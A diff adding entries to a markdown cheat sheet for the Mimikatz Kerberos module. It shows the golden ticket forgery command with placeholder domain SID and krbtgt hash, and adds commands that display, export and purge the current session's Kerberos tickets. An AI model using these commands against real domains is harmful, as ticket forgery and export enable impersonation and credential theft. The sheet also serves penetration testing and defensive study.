@@ -227,3 +227,25 @@ OR
 ##### /renewmax = Maximum renewal duration (in minutes)
 
        kerberos::golden /user:USER_TO_IMPERSONATE /domain:DOMAIN.LOCAL /sid:SID_OF_THE_DOMAIN /krbtgt:KRBTGT_NTLM_HASH /id:USER_ID /groups:GROUP_ID_USER_BELONGS_TO /ticket:USER_TO_IMPERSONATE.DOMAIN.kirbi
+
+3) tgt
+
+#### Displays information about the TGT of the current session
+
+       kerberos::tgt
+
+4) list
+
+#### Lists and exports Kerberos tickets (TGT and TGS) of the current session
+
+### Arguments:
+
+##### /export = Exports all tickets to files
+
+       kerberos::list /export
+
+5) purge
+
+#### Purges all tickets of the current session
+
+       kerberos::purge 
